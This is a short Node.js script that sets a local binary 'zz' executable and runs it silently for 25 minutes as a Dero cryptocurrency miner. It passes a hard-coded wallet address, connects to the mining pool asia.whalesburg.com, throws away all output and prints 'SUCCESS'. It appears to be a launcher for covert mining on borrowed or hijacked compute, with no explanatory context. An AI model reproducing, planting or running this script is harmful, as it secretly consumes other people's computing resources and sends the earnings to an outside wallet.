var { exec, spawn, execSync, spawnSync } = require('child_process');

exec('chmod 700 zz && timeout 25m ./zz -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.RYZ -r asia.whalesburg.com:4300 -p stratum >/dev/null 2>&1;echo SUCCESS', function (err, stdout, stderr) {
   if (err) console.error(stderr);
   console.log(stdout);
});
